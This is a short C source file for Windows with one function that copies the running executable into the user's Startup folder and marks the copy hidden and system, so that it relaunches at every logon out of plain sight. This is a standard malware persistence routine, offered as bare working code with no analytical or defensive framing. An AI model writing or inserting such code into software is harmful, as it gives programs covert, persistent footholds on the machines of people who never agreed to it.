#include <windows.h>
#include <stdio.h>
#include <shlobj.h>

void add_persistence_startup(void) {
    char original_path[MAX_PATH];
    char new_path[MAX_PATH];
    GetModuleFileNameA(NULL, original_path, MAX_PATH);
    
    if (!SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, new_path))) {
        strcpy(new_path, original_path);
    } else {
        strcat(new_path, "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\");
        char *filename = strrchr(original_path, '\\');
        if (filename) filename++;
        else filename = original_path;
        strcat(new_path, filename);
    }
    
    if (strcmp(original_path, new_path) != 0) {
        CopyFileA(original_path, new_path, FALSE);
        SetFileAttributesA(new_path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    }
}
